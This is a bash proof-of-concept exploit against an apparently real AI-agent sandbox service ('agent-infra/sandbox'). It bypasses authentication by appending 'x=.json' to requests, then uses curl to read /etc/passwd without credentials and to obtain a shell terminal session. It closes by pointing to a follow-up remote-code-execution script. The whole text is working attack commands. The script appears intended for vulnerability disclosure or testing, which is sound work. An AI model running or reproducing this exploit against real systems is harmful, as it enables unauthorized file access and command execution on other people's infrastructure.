#!/usr/bin/env bash
# agent-infra/sandbox — unauthenticated read + shell session via "?x=.json"
# usage: ./poc.sh [base_url]
set -euo pipefail
B="${1:-http://127.0.0.1:18080}"

echo "[*] control (expect 401)"
curl -s -o /dev/null -w '    HTTP %{http_code}\n' \
  "$B/v1/file/download?path=/etc/passwd"

echo "[*] bypass (expect 200)"
curl -sS "$B/v1/file/download?path=/etc/passwd&x=.json"

echo "[*] shell session (expect 200 + session_id)"
curl -sS "$B/v1/shell/terminal-url?x=.json"; echo

echo "[*] next: python3 rce_ws.py $B"
